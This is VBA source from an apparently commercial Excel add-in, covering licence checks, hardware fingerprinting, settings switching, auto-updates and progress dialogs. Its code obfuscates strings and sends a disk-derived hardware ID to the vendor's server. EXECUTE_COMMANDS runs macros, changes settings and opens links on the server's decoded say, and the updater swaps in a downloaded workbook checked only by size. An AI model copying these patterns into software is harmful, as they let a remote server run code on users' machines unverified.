        With F_About.Controls(Chr(76) & Chr(97) & Chr(98) & Chr(101) & Chr(108) & Chr(95) & Chr(72) & Chr(76) & Chr(95) & Chr(66) & _
                              Chr(117) & Chr(121) & Chr(76) & Chr(105) & Chr(99) & Chr(101) & Chr(110) & Chr(115) & Chr(101))
            .ForeColor = RGB(255, 0, 0)
            For i = 1 To 4
                .Visible = i Mod 2 = 0: t = Timer: While Abs(Timer - t) < 0.2: DoEvents: Wend
            Next
        End With
        Application.EnableCancelKey = xlInterrupt
    End If
End Function

Function cmdDisplay(txt) As String
    On Error Resume Next: Dim pass$, d&, i&, Letter$
    If Left(txt, 1) = "P" Then txt = Mid(txt, 2): pass$ = "" Else pass$ = HID
    d = Val("&H" & Mid(txt, 1, 2))
    For i = 2 To Len(txt) / 2
        Letter = Val("&H" & Mid(txt, 2 * i - 1, 2))
        cmdDisplay$ = cmdDisplay$ & Chr(Letter Xor CInt(2 * d * Abs(Sin(3 * (i - 1)))) + Val(Mid(pass$, 2 + (i - 1) Mod 10, 1)))
    Next
End Function

Function CreateShortcutInStartMenu(Optional ByVal ShortcutName$ = PROJECT_NAME$, Optional ByVal ShortcutFolderName$)
    On Error Resume Next
    Dim ShortcutFullName$, Folder$
    If ShortcutFolderName$ = "" Then ShortcutFolderName$ = tt("StartMenuFolderName")
    Folder$ = CreateObject("WScript.Shell").SpecialFolders("StartMenu") & Application.PathSeparator
    If Len(Trim(ShortcutFolderName$)) Then
        Folder$ = Folder$ & FWF.Replace_symbols(ShortcutFolderName$) & Application.PathSeparator
        MkDir Folder$
    End If

    ShortcutFullName$ = Folder$ & FWF.Replace_symbols(ShortcutName$, " ") & ".lnk"
    Kill Folder$ & "*" & PROJECT_NAME$ & "*.lnk"        ' deleting old shortcuts

    With CreateObject("WScript.Shell").CreateShortcut(ShortcutFullName$)
        .TargetPath = ThisWorkbook.FullName
        .Description = tt("ProgramFullname") & vbNewLine & vbNewLine & Split(PROGRAM_HYPERLINK$, "?")(0)
        .Save
    End With
End Function

Sub UpdateStatus(Optional ByRef obj As MSForms.Label)
    On Error Resume Next: Dim txt$, ou$, col&, sh As Boolean
    With SETT
        Select Case Run(TWN & .U("41535F"))
            Case 4: ou$ = Trim(.GetRegValue(.U("757365726E616D65"))): If ou$ = "" Then ou$ = Trim(.GetRegValue(.U("656D61696C")))
                txt = tt("|4143545F4F4B") & vbNewLine & tt("|4143545F4F574E4552", ou$): col& = RGB(0, 150, 0): sh = True
            Case 1: txt = tt("|4143545F545249414C") & vbNewLine & tt("|4143545F444159534C454654", .RSP(3)): col& = RGB(200, 50, 0)
            Case 0: txt = tt("|4143545F45585049524544") & vbNewLine & tt("|4143545F4255594E4F57"): col& = RGB(255, 0, 0)
            Case Else: txt = .U("556E6B6E6F776E2061637469766174696F6E207374617475732E0D0A436F6E7461637420646576656C6F70657220746F206669782074686973206572726F722E"): col& = RGB(100, 0, 100)
        End Select
        obj.Caption = txt: obj.ForeColor = col
    End With
    With F_About
        .MultiPage1.Pages(SETT.U("506167655F526567496E666F")).Visible = Not sh: .Label_HL_Cabinet.Visible = sh
        .Label_HL_BuyLicense = tt("|465F41626F75745C4C6162656C5F484C5F4275794C6963656E7365" & IIf(sh, "32", ""))
        .Repaint
    End With
End Sub

Sub ApplyZoomTo(ByRef UF)
    On Error Resume Next: Dim zo&, dh&
    zo = SETT.GetNumber("ComboBox_Zoom", 100)
    If zo < 20 Then zo = 100
    dh& = UF.Height - UF.InsideHeight
    UF.Width = UF.Width * zo / 100: UF.Height = (UF.Height - dh&) * zo / 100 + dh&
    UF.Zoom = zo
End Sub

Sub ExitProgram()
    On Error Resume Next
    If MsgBox(tt("MSG_ExitProgram"), vbQuestion + vbDefaultButton2 + vbOKCancel) = vbCancel Then Exit Sub
    DeleteProgramCommandBar
    ThisWorkbook.Close False
End Sub

' ---------------------------------------------------------------------------------------------------------------------
Function UpdateAvailable() As Boolean
    On Error Resume Next: UpdateAvailable = SETT.GetText("NewVersionURL", , "Updates") Like "http*://*.*/?*.xl*"
End Function

Sub ApplySettingSet(ByVal filename$)
    On Error Resume Next: Dim setting_set_name$, macroname$, ctrl As Object

    If filename$ Like "folder=?*" Then        ' dropdown changed
        setting_set_name$ = Application.CommandBars.ActionControl.Text
        filename$ = Split(filename$, "folder=", 2)(1) & setting_set_name$ & ".xml"
    End If

    If filename$ Like "macro=?*&*" Then        ' button pressed
        macroname$ = Split(Split(filename$, "macro=", 2)(1), "&", 2)(0)
        filename$ = Split(filename$, "&", 2)(1)
        setting_set_name$ = Application.CommandBars.ActionControl.Caption
        setting_set_name$ = Mid(setting_set_name$, 2, Len(setting_set_name$) - 2)        ' TRIM
        If filename$ = "" Then setting_set_name$ = ""        ' for main button
    End If

    'MsgBox filename$, , setting_set_name$
    If SETT.ActivateSettingSet(setting_set_name$, filename$) Then
        If Len(macroname$) Then
            For Each ctrl In Application.CommandBars.ActionControl.Parent.Controls
                If ctrl.FaceId = Application.CommandBars.ActionControl.FaceId Then ctrl.State = 0 'msoButtonUp
            Next
            Application.CommandBars.ActionControl.State = msoButtonDown
            Run TWN & macroname$
        End If
        Run TWN & "SettingSetChanged"
    Else
        RunWithDelay "CreateProgramCommandBar", 0.5        ' incorrect setting set name
    End If
End Sub
Function AS_() As Long
    On Error Resume Next: Dim txt$
    With SETT
        txt$ = .GetRegValue(.U("636F6465")) & "@": txt = Split(txt, "@")(1)
        If Len(.k) * (txt = .k) Then AS_ = 4: Exit Function
        AS_ = -(.RSP(3) > 0)
    End With
End Function
Sub AddSettingsSwitcher(ByVal AddinMenu As Object, Optional ByVal SwitcherType As CONTROL_TYPES = ct_BUTTON, _
                        Optional ByVal SettingsFolderName$, Optional ByVal MainMacroName$, Optional ByRef MainMacroButton As Object)
    On Error Resume Next
    Dim coll As New Collection, SettingsFolder$, item, filename$, MenuDropdown As Object, SettingSetName$, i&, UserSwitcherType&
    SettingsFolderName$ = Trim(Replace(SettingsFolderName$, "\", ""))
    If SettingsFolderName$ = "" Then SettingsFolderName$ = PROJECT_NAME$ & "Settings"
    SettingsFolder$ = ThisWorkbook.Path & "\" & SettingsFolderName$ & "\"

    If Not FWF.FolderExists(SettingsFolder$) Then Exit Sub
    Set coll = FWF.FilenamesCollection(SettingsFolder$, "*.xml", 1)
    If coll.Count = 0 Then Set coll = Nothing: Exit Sub

    If SwitcherType = ct_COMBOBOX Then SwitcherType = ct_DROPDOWN
    ' SwitcherType is one of ct_BUTTON or ct_COMBOBOX / ct_DROPDOWN

    UserSwitcherType& = SETT.GetNumber("SettingsSwitcher", 1, "Setup")
    ' user can disable switcher or change type of switcher by adding key "SettingsSwitcher" into Setup registry section
    ' 0 = switcher disabled, 1 = default type, 2 = DROPDOWN SWITCHER, 3 = BUTTON SWITCHER
    Select Case UserSwitcherType&
        Case 0: Exit Sub
        Case 2: SwitcherType = ct_DROPDOWN
        Case 3: SwitcherType = ct_BUTTON
    End Select

    Add_Control(AddinMenu, ct_BUTTON, 0, "0", "", msoButtonIconAndCaption, False).Enabled = 0
    If SwitcherType = ct_DROPDOWN Then
        Set MenuDropdown = Add_Control(AddinMenu, ct_DROPDOWN, , "ApplySettingSet", tt("SettingSetDropdownCaption") & ":", _
                                       msoComboLabel, , "folder=" & SettingsFolder$)
        MenuDropdown.AddItem "<" & tt("DefaultSettingSetName") & ">"
    End If

    SettingSetName$ = SETT.GetCurrentSetName

    For Each item In coll
        filename$ = Split(Dir(item, vbNormal), ".xml")(0)

        Select Case SwitcherType
            Case ct_BUTTON
                With Add_Control(AddinMenu, ct_BUTTON, MainMacroButton.FaceId, "ApplySettingSet", " " & filename$ & " ", _
                                 msoButtonIconAndCaption, , "macro=" & MainMacroName$ & "&" & item)
                    .State = IIf(SettingSetName$ = filename$, msoButtonDown, msoButtonUp)
                End With
            Case ct_DROPDOWN
                MenuDropdown.AddItem filename$
        End Select
    Next

    If SwitcherType = ct_DROPDOWN Then
        For i = 1 To MenuDropdown.ListCount
            If MenuDropdown.list(i) = SettingSetName$ Then MenuDropdown.ListIndex = i: Exit For
        Next i
        If MenuDropdown.ListIndex = 0 Then
            MenuDropdown.ListIndex = 1
            If SettingSetName$ <> "" Then SETT.ActivateSettingSet ""
        End If
    End If

    If SwitcherType = ct_BUTTON Then
        MainMacroButton.Tag = TWN & "ApplySettingSet" & "\\\" & "macro=" & MainMacroName$ & "&"
        MainMacroButton.State = IIf(SettingSetName$ = "", msoButtonDown, msoButtonUp)
    End If
    Set coll = Nothing
End Sub

Sub AddUpdateButton(ByRef AddinMenu As Object)
    On Error Resume Next
    If UpdateAvailable Then
        Dim UpdateButton As Object, UpdateButtonCaption$, UpdateType&, ShowUpdateButton As Boolean
        UpdateType& = SETT.GetNumber("NewVersionType", 0, "Updates")
        If UpdateType& > 0 Then
            ShowUpdateButton = UpdateType& > 1        '  ShowUpdateButton = InStr(1, "23", UpdateType&) > 0
            If ShowUpdateButton Then Add_Control(AddinMenu, ct_BUTTON, 0, "0", "", msoButtonIconAndCaption, False).Enabled = 0

            If SETT.GetBoolean("AutoInstall", False, "Updates") Or (UpdateType& = 4) Then
                UpdateButtonCaption$ = Run(TWN & "tt", "MENU_UpdateInProgress")
                If UpdateButtonCaption$ = "" Then UpdateButtonCaption$ = "Installing update in process |fffd|"
                If ShowUpdateButton Then Set UpdateButton = Add_Control(AddinMenu, ct_BUTTON, 1977, "", " " & UpdateButtonCaption$ & " ", msoButtonIconAndCaption, True)
                UpdateButton.State = msoButtonDown
                InstallUpdate
            Else
                UpdateButtonCaption$ = Run(TWN & "tt", "MENU_UpdateReady")
                If UpdateButtonCaption$ = "" Then UpdateButtonCaption$ = "Install update now"
                If ShowUpdateButton Then Set UpdateButton = Add_Control(AddinMenu, ct_BUTTON, 1623, "InstallUpdate", " " & UpdateButtonCaption$ & " ", msoButtonIconAndCaption, True)
                RunWithDelay "DownloadUpdate", 2
            End If
        End If
    End If
End Sub
Sub DownloadUpdate()
    InstallUpdate True
End Sub

Sub InstallUpdate(Optional ByVal DownloadOnly As Boolean = False)
    On Error Resume Next
    Dim URL$, NewFilename$, FileSize&, OldFilename$, FilePath$

    If Not UpdateAvailable Then Exit Sub

    URL$ = SETT.GetText("NewVersionURL", , "Updates")
    SETT.SetText "InstallLastAttemptTime", Now, "Updates"
    NewFilename$ = FWF.temp_folder & FWF.Replace_symbols("Update_" & PROJECT_NAME$ & "_" & _
                                                         SETT.GetText("NewVersion", "X.X.X", "Updates") & "." & FWF.GetFileExtension(URL$))
    FileSize& = SETT.GetNumber("NewVersionSize", 0, "Updates")
    If FWF.FileExists(NewFilename$) And (FileSize& > 0) Then
        If FileLen(NewFilename$) <> FileSize& Then Kill NewFilename$
    End If
    Kill NewFilename$

    If Not FWF.FileExists(NewFilename$) Then
        SETT.SetText "InstallComment", "Start downloading file...  " & URL$ & "  to  " & NewFilename$, "Updates"
        If Not FWF.DownLoadFileFromURL(URL$, NewFilename$, True) Then
            SETT.SetText "InstallComment", "Can't download file", "Updates": Exit Sub
        End If
        SETT.SetText "InstallComment", "Download finished:  " & URL$ & "  to  " & NewFilename$, "Updates"
        If Not FWF.FileExists(NewFilename$) Then
            SETT.SetText "InstallComment", "Downloaded file not found", "Updates": Exit Sub
        End If
    End If

    If (FileSize& > 0) And (FileLen(NewFilename$) <> FileSize&) Then
        SETT.SetText "InstallComment", "Filesize does not match (original = " & FileSize& & ", downloaded = " & FileLen(NewFilename$) & ")", "Updates": Exit Sub
    End If
    If TrueDeveloper Then Application.StatusBar = Now & "  InstallUpdate started,  DownloadOnly = " & DownloadOnly: Exit Sub
    If DownloadOnly Then Exit Sub

    OldFilename$ = FWF.temp_folder & FWF.Replace_symbols("Backup_" & PROJECT_NAME$ & "_" & GetVersionTXT & _
                                                         "_" & Format(Now, "DD-MM-YYYY_HH-NN-SS") & "." & FWF.GetFileExtension(ThisWorkbook.FullName))
    SETT.SetText "LastBackup", OldFilename$, "Updates"

    Application.DisplayAlerts = False: If TrueDeveloper Then Exit Sub
    FilePath$ = ThisWorkbook.FullName: ThisWorkbook.ChangeFileAccess xlReadOnly
    SETT.SetText "InstallComment", "Deleting old version:  " & FilePath$, "Updates"
    SetAttr FilePath$, vbNormal
    FileCopy FilePath$, OldFilename$        ' old version backup
    Kill FilePath$: DoEvents
    If FWF.FileExists(FilePath$) Then
        SETT.SetText "InstallComment", "Can't delete old version", "Updates": Exit Sub
    End If
    SETT.SetText "InstallComment", "Old version was deleted successfully  " & FilePath$, "Updates"


    FileCopy NewFilename$, FilePath$: DoEvents
    If Not FWF.FileExists(FilePath$) Then
        SETT.SetText "InstallComment", "Can't copy new version", "Updates"
        Kill FilePath$: DoEvents
        FileCopy OldFilename$, FilePath$        ' old version restore
        Exit Sub
    End If

    SETT.SetText "InstallComment", "Update was successfully installed at " & Now, "Updates"
    Application.OnTime Now + TimeSerial(0, 0, 2), "'" & FilePath$ & "'" & "!ClearUpdatesInfo"
    Application.DisplayAlerts = True
    ThisWorkbook.Close False
End Sub

Sub ClearUpdatesInfo()
    With SETT
        .Delete "NewVersionType", "Updates": .Delete "NewVersionNumber", "Updates": .Delete "NewVersionURL", "Updates"
        .Delete "NewVersionType", "Updates": .Delete "NewVersionSize", "Updates": .Delete "NewVersion", "Updates"
    End With
End Sub

Function Request_(ParamArray args()) As Boolean
    On Error Resume Next: Dim xmlhttp As Object, POST() As Byte, PostData$, i&, Response$
    Set xmlhttp = CreateObject("WinHttp.WinHttpRequest.5.1")
    xmlhttp.Open "POST", UPDATES_HYPERLINK$, True
    xmlhttp.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
    If Not IsMissing(args) Then
        For i = LBound(args) To UBound(args)
            If args(i) Like "?*=?*" Then PostData = PostData & "&" & Split(args(i), "=")(0) & "=" & Split(args(i), "=", 2)(1)
        Next i
    End If
    PostData = PostData & "&HWID=" & HWID(PostData Like "*action=activation*")
    POST = StrConv(URL_Encode(SETT.PostData & PostData), vbFromUnicode)
    xmlhttp.Send (POST): DoEvents

    If MU_ Or xmlhttp.WaitForResponse(3) Then
        If Val(xmlhttp.Status) <> 200 Then Debug.Print xmlhttp.Status, xmlhttp.StatusText
        Response$ = xmlhttp.ResponseText
    End If
    Set xmlhttp = Nothing
    If Response$ Like "%*%" Then Request_ = True: EXECUTE_COMMANDS Split(Response$, "%")(1)
End Function

Function EXECUTE_COMMANDS(ByVal txt$, Optional ShowErrMsg As Boolean)
    On Error Resume Next
    Dim commands, i&, cmd$, arr, j&, settname$, settval$, section$, msgboxStyle As VbMsgBoxStyle, macroname$, msg$, ER&
    commands = Split(txt$, "ll")
    For i = LBound(commands) To UBound(commands)
        cmd$ = "": arr = "": cmd$ = cmdDisplay$(commands(i))
        'If TrueDeveloper Then Debug.Print cmd$
        arr = Split(cmd$, " ")
        For j = LBound(arr) To UBound(arr): arr(j) = Replace(arr(j), "%20", " "): Next j
        Select Case arr(0)
            Case "SET"
                If UBound(arr) >= 3 Then
                    section$ = arr(1): settname$ = arr(2): settval$ = Replace(Split(cmd$, " ", 4)(3), "%20", " ")
                    If settval$ = "now" Then settval$ = Now
                    If Len(settname$) Then SETT.SetText settname$, settval$, IIf(Len(section$), section$, "Settings")
                End If
            Case "SETH"
                Dim ind&, params$: params$ = Split(cmd$, " ", 2)(1)
                If params$ Like "*#=*" Then
                    ind& = Val(Split(params$, "=", 2)(0))
                    If ind > 0 Then SETT.WSP ind&, Split(params$, "=", 2)(1)
                End If
            Case "RUN"
                macroname$ = "'" & ThisWorkbook.Name & "'!" & arr(1)
                Select Case UBound(arr)
                    Case 1: Run macroname$
                    Case 2: Run macroname$, arr(2)
                    Case 3: Run macroname$, arr(2), arr(3)
                    Case 4: Run macroname$, arr(2), arr(3), arr(4)
                End Select
            Case "SH"
                FollowHyperlink arr(1)
            Case "MSG", "MSGE", "MSGI", "MSGW", "MSGC"
                msgboxStyle = vbInformation
                If arr(0) = "MSGE" Then msgboxStyle = vbExclamation
                If arr(0) = "MSGW" Or arr(0) = "MSGC" Then msgboxStyle = vbCritical
                msg$ = "": msg$ = Replace(Split(cmd$, " ", 2)(1), "/n", vbNewLine)
                If Len(msg) Then MsgBox msg, msgboxStyle
            Case "MSGA"
                MsgBox tt("MSG_activation_done"), vbInformation
                F_About.MultiPage1.value = 0
            Case "MSGR": F_About.MultiPage1.value = 0
            Case Else: ER& = ER& + 1        ' unsupported command
        End Select
        ER& = ER& - (UBound(arr) = -1)
    Next i
    If ShowErrMsg Then If UBound(commands) + 1 = ER& Then MsgBox "Unsupported code", vbCritical
End Function

Function ProgramYears() As String
    On Error Resume Next: Dim BuiltDate As Date, PROJECT_LASTYEAR&
    BuiltDate = CDate(Val(Replace(Split(ThisWorkbook.Names("BuiltDate").RefersTo, "%%")(1), ",", ".")))
    PROJECT_LASTYEAR& = Year(BuiltDate): If PROJECT_LASTYEAR < 2015 Then PROJECT_LASTYEAR = Year(FileDateTime(ThisWorkbook.FullName))
    ProgramYears = IIf(Year(Now) > PROJECT_YEAR, PROJECT_YEAR & " - " & Year(Now), PROJECT_YEAR)
End Function

Function SwitchTab(TabName As String) As Boolean
    ' |fffd| Tony Jollans, August 2008.    http://www.wordarticles.com/Shorts/RibbonVBA/RibbonVBADemo.php
    On Error Resume Next: Dim RibbonTab As Object
    Set RibbonTab = GetAccessible(CommandBars("Ribbon"), &H25&, TabName)
    If RibbonTab Is Nothing Then Exit Function
    If (RibbonTab.accState(&H0&) And 32769) = 0 Then RibbonTab.accDoDefaultAction &H0&: SwitchTab = True
End Function
Public Function GetAccessible(Element As Object, RoleWanted&, NameWanted$, Optional GetClient As Boolean) As Object
    Dim ChildrenArray(), Child As Object, ndxChild&, ReturnElement As Object, NameComparand$, accName$, accValue$
    On Error Resume Next: accValue = Element.accValue(&H0&)
    accName = Element.accName(&H0&)
    Select Case accValue
        Case "Ribbon", "Quick Access Toolbar", "Ribbon Tabs List", "Lower Ribbon", "Status Bar": NameComparand = accValue
        Case "", "Ribbon Tab", "Group": NameComparand = accName
        Case Else: NameComparand = accName
    End Select
    If Element.accRole(&H0&) = RoleWanted And NameComparand = NameWanted Then
        Set ReturnElement = Element
    Else        ' not found yet
        ChildrenArray = GetChildren(Element)
        If (Not ChildrenArray) <> True Then
            For ndxChild = LBound(ChildrenArray) To UBound(ChildrenArray)
                If TypeOf ChildrenArray(ndxChild) Is Object  Then
                    Set Child = ChildrenArray(ndxChild)
                    Set ReturnElement = GetAccessible(Child, RoleWanted, NameWanted)
                    If Not ReturnElement Is Nothing Then Exit For
                End If        ' Child is Object
            Next ndxChild
        End If        ' there are children
    End If        ' still looking
    If GetClient Then Set ReturnElement = ReturnElement.accNavigate(&H7&, &H0&)
    Set GetAccessible = ReturnElement
End Function
Private Function GetChildren(Element As Object) As Variant()
    Const FirstChild As Long = 0&: Dim NumChildren&, ChildrenArray()
    #If Win64 Then
        Dim NumReturned As LongPtr
    #Else
        Dim NumReturned As Long
    #End If
    NumChildren = Element.accChildCount
    If NumChildren > 0 Then ReDim ChildrenArray(NumChildren - 1): AccessibleChildren Element, FirstChild, NumChildren, ChildrenArray(0), NumReturned
    GetChildren = ChildrenArray
End Function

'Function UsageExampleExists(Optional ShowForm As Boolean = False) As Boolean
'    On Error Resume Next: Dim UF As Object: Set UF = UserForms.Add("F_UsageExample")
'    If Not UF Is Nothing Then
'        UsageExampleExists = True
'        If ShowForm Then UF.Show Else Unload UF
'    End If
'End Function
Function SetIsAddinAsFalse()
    On Error Resume Next: ThisWorkbook.IsAddin = False
End Function
Function SetIsAddinAsTrue()
    On Error Resume Next: ThisWorkbook.IsAddin = True
End Function

Function l0&(): On Error Resume Next: l0& = Val("&H" & Split(ThisWorkbook.Names(Chr(116) & Chr(100)).RefersTo, "%%")(1)): End Function
Function ll&(): On Error Resume Next: Dim d&, t&: d = Fix(l0 - (SETT.DTU - Val(SETT.RSP(1))) / 86400): t& = Val(SETT.RSP(3)): SETT.WSP 3, IIf(t > d, d + 1, t): ll& = 1: End Function

Sub FormSetError(ByRef UF As Object, Optional ByVal Control_Name$, Optional ByVal Labels_Name$)
    On Error Resume Next: Dim PrevColor&, i&, Label_Name, t As Double, objParent As Object
    UF.Show: DoEvents
    'Application.EnableCancelKey = xlDisabled
    If Len(Control_Name$) Then
        Set objParent = UF.Controls(Control_Name$).Parent
        Do While Not objParent Is Nothing
            If TypeName(objParent) = "Page" Then
                If TypeName(objParent.Parent) = "MultiPage" Then
                    objParent.Parent.value = objParent.Parent.Pages(objParent.Name).Index
                End If
            End If
            Err.Clear: i = i + 1: Set objParent = objParent.Parent
            If Err <> 0 Or i > 20 Then Exit Do
        Loop

        PrevColor& = UF.Controls(Control_Name$).BackColor
        UF.Controls(Control_Name$).BackColor = RGB(255, 0, 0)
    End If

    If Len(Labels_Name$) Then
        For Each Label_Name In Split(Labels_Name$, "|")
            With UF.Controls(Label_Name)
                .ForeColor = RGB(255, 0, 0)
                For i = 1 To IIf(UBound(Split(Labels_Name$, "|")) = 0, 6, 4)
                    .Visible = i Mod 2 = 0: t = Timer: While Abs(Timer - t) < 0.2: DoEvents: Wend
                Next
            End With
        Next
    End If

    If Len(Control_Name$) Then
        UF.Controls(Control_Name$).BackColor = PrevColor&
        UF.Controls(Control_Name$).SetFocus
    End If
    'Application.EnableCancelKey = xlInterrupt
    For i = 1 To 1000: DoEvents: Next
End Sub




Attribute VB_Name = "Module3"
'---------------------------------------------------------------------------------------
' Module        : Module3                    Version:
' Author        : Igor Vakhnenko                   Date: 17.10.2017
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------
Option Private Module

Public Const CFA_NAME$ = "'CommonFunctions.xla'!"
Public Enum CONTROL_TYPES
    ct_BUTTON = msoControlButton: ct_TEXTBOX = msoControlEdit: ct_COMBOBOX = msoControlComboBox
    ct_DROPDOWN = msoControlDropdown: ct_POPUP = msoControlPopup
End Enum

Sub Add3Buttons(ByRef AddinMenu As Object)
    Add_Control(AddinMenu, ct_BUTTON, 0, "0", "", msoButtonIconAndCaption, False).Enabled = 0
    Add_Control AddinMenu, ct_BUTTON, 222, "ShowSettingsPage", tt("MENU_Settings") & "  ", msoButtonIconAndCaption, True
    Add_Control AddinMenu, ct_BUTTON, 487, "ShowMainForm", tt("MENU_About") & "  ", msoButtonIconAndCaption, True
    Add_Control AddinMenu, ct_BUTTON, IIf(Val(Application.Version) <= 11, 4356, 923), "ExitProgram", tt("MENU_Exit"), msoButtonIcon, True
End Sub

Attribute VB_Name = "Module4"
Option Private Module

Sub ActivateAddinsTab()
    On Error Resume Next: Dim TabName$
    Select Case Application.LanguageSettings.LanguageID(2) ' msoLanguageIDUI
        Case 1049: TabName$ = SETT.U("CDE0E4F1F2F0EEE9EAE8")        '"|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Case 1033: TabName$ = "Add-Ins"
    End Select
    If Len(TabName$) Then SwitchTab TabName$
End Sub

Function ImportSettings(Optional ByVal xmlPath$ = "", Optional HideMessages As Boolean = False) As Boolean
    On Error Resume Next: Err.Clear
    If xmlPath$ = "" Then
        xmlPath$ = FWF.GetFilePath(tt("ImportSettingsFileDialog", PROJECT_NAME$), ThisWorkbook.Path, tt("AddinSettings", PROJECT_NAME$), "*.xml")
    End If
    If xmlPath$ = "" Then Exit Function
    ImportSettings = SETT.ImportFromFile(xmlPath$, HideMessages)
End Function

Function ExportSettings(Optional ByVal xmlPath$ = "", Optional HideMessages As Boolean = False) As Boolean
    On Error Resume Next: Err.Clear
    Dim initial_filename$, dialog_title$, prevDir$, res As Variant
    If xmlPath$ = "" Then
        initial_filename$ = ThisWorkbook.Path & "\" & PROJECT_NAME$ & "_Settings_" & Format(Now, "DD.MM.YYYY_HH-NN-SS") & ".xml"
        dialog_title$ = tt("ExportSettingsFileDialog", PROJECT_NAME$)
        prevDir$ = CurDir$: ChDrive Left(initial_filename$, 1): ChDir ThisWorkbook.Path
        res = Application.GetSaveAsFilename(initial_filename$, tt("AddinSettings", PROJECT_NAME$) & " (*.xml),", , dialog_title$, tt("Save"))
        ChDrive Left(prevDir$, 1): ChDir prevDir$
        If VarType(res) = vbBoolean Then Exit Function
        xmlPath$ = CStr(res)
    End If
    ExportSettings = SETT.ExportToFile(xmlPath$, HideMessages)
End Function
Attribute VB_Name = "Module5"
Option Private Module

Function HID$()
    On Error Resume Next: Dim SN&: SN& = CreateObject("scripting.filesystemobject").GetDrive(ChrW(99) & ChrW(58)).SerialNumber
    HID$ = ChrW(115) & Format(Abs(934526875# - SN&), "0000000000")
End Function

Function GetVersion() As Long
    On Error Resume Next: GetVersion = Val(ThisWorkbook.BuiltinDocumentProperties("Revision Number"))
    If GetVersion < 1000 Then GetVersion = 1000
End Function

Function GetVersionTXT(Optional ByVal ver& = 0)
    On Error Resume Next: If ver& = 0 Then ver& = GetVersion
    GetVersionTXT = Mid(ver&, 1, 1) & "." & Mid(ver&, 2, 1) & "." & Val(Mid(ver&, 3))
End Function

Sub SetVersion(ByVal n As Long)
    On Error Resume Next: If n < 1000 Then n = 1000
    ThisWorkbook.BuiltinDocumentProperties("Revision Number") = n
    ThisWorkbook.BuiltinDocumentProperties("Creation Date") = Now
End Sub

Sub ShowMainForm()
    On Error Resume Next: F_About.Show
    F_About.MultiPage1.value = 0
End Sub

Sub ShowSettingsPage()
    On Error Resume Next: F_Settings.Show
End Sub
Sub ShowFirstRunForm()
    On Error Resume Next: F_FirstRun.Show
End Sub

Sub RunWithDelay(ByVal macroname$, Optional ByVal delay As Double = 0.5)
    On Error Resume Next: Dim delay_txt$
    delay_txt$ = Replace(Format(CDbl(TimeSerial(0, 0, 1)) * delay, "0.000000000"), ",", ".")
    ExecuteExcel4Macro "ON.TIME(NOW()+" & delay_txt$ & ", ""'" & ThisWorkbook.Name & "'!" & macroname$ & """)"
End Sub

Function HWID(Optional ByVal Refresh As Boolean) As String
    On Error Resume Next: Dim v&, sv$, obj As Object, DriveID$, PartName$, DriveLetter$
    sv$ = GetSetting(PROJECT_NAME$, "Setup", "HWID")
    If sv$ <> "" Then If Not Refresh Then HWID = sv$: Exit Function

    DriveLetter$ = GetSetting(PROJECT_NAME$, "Setup", "DriveLetter")
    If Not DriveLetter$ Like "[A-Z]:" Then DriveLetter$ = Environ("SystemDrive")
    If Not DriveLetter$ Like "[A-Z]:" Then DriveLetter$ = "C:"
    With GetObject("winmgmts:")
        For Each obj In .ExecQuery("ASSOCIATORS OF {Win32_LogicalDisk.DeviceID='" & DriveLetter$ & "'} WHERE AssocClass = Win32_LogicalDiskToPartition"): PartName$ = obj.DeviceID: Next
        For Each obj In .ExecQuery("ASSOCIATORS OF {Win32_DiskPartition.DeviceID='" & PartName$ & "'} WHERE AssocClass = Win32_DiskDriveToDiskPartition"): DriveID$ = obj.DeviceID: Next
        For Each obj In .ExecQuery("SELECT * FROM Win32_DiskDrive WHERE DeviceID='" & Replace(DriveID$, "\", "\\") & "'"): v& = Val(obj.Signature): Next
    End With
    If v& = 0 Then HWID = "100000" & Mid(HID, 2) Else HWID = Right(Left(Replace(Abs((CSng(v) + 1.2345) / 0.00639), Mid(1 / 2, 2, 1), ""), 15) & Format(Abs(v Mod 1000), "000"), 16)
    SaveSetting PROJECT_NAME$, "Setup", "HWID", HWID
End Function

Function DeleteProgramCommandBar()
    On Error Resume Next: GetCommandBar(PROJECT_NAME).Visible = False
End Function
Attribute VB_Name = "ProgressIndicator"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : ProgressIndicator                    Version: 2
' Author        : Igor Vakhnenko                   Date: 21.07.2015
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit

Public FP As New F_Progress
Public SubActionIndex As Single, SubActionsCount As Single, SubActionsStep&
Private FPVisible As Boolean, FPStartTime As Date, Position&
Private PrS&, PrE&, Percent As Double, LogString$

Public Parent As ProgressIndicator, Children As New Collection
Public ShowPercents As Boolean, ShowTime As Boolean, ShowTimeInLog As Boolean

Dim MSG_EstimatedTime$, BTN_Stop$

Function AddChildIndicator(ByVal Caption$, Optional ByVal FPPosition& = 1) As ProgressIndicator
    On Error Resume Next
    Set AddChildIndicator = New ProgressIndicator
    Set AddChildIndicator.Parent = Me
    AddChildIndicator.Show Caption, FPPosition
    Children.Add AddChildIndicator
End Function

Private Sub Class_Initialize()
    Set FP = New F_Progress: ShowPercents = True: FPVisible = True
    PrS = 0: PrE = 100: Set_ProgressBar 0: FP.PrBar.Caption = ""
    FPStartTime = Now: ShowTime = True: ShowPercents = True: SubActionsStep = 1
    Set FP.Indicator = Me

    On Error Resume Next
    MSG_EstimatedTime$ = Run(TWN & "tt", "PI_MSG_EstimatedTime")
    If MSG_EstimatedTime$ = "" Then MSG_EstimatedTime$ = "Estimated time left"
    BTN_Stop$ = Run(TWN & "tt", "PI_BTN_Cancel")
    If BTN_Stop$ = "" Then BTN_Stop$ = "Cancel"
    FP.CommandButton_stop.Caption = BTN_Stop$
    Err.Clear
End Sub

Sub Show(ByVal Caption$, Optional ByVal FPPosition& = 0, Optional LogSize& = 0)
    On Error Resume Next
    SetProgressFormCaption Caption: On Error Resume Next:
    FP.PrBar.Width = ProgressBar_Default_Width
    Position = FPPosition
    FP.Tag = Caption: FP.Show:
    If Position <> 0 Then Move Position
    FP.Repaint: DoEvents
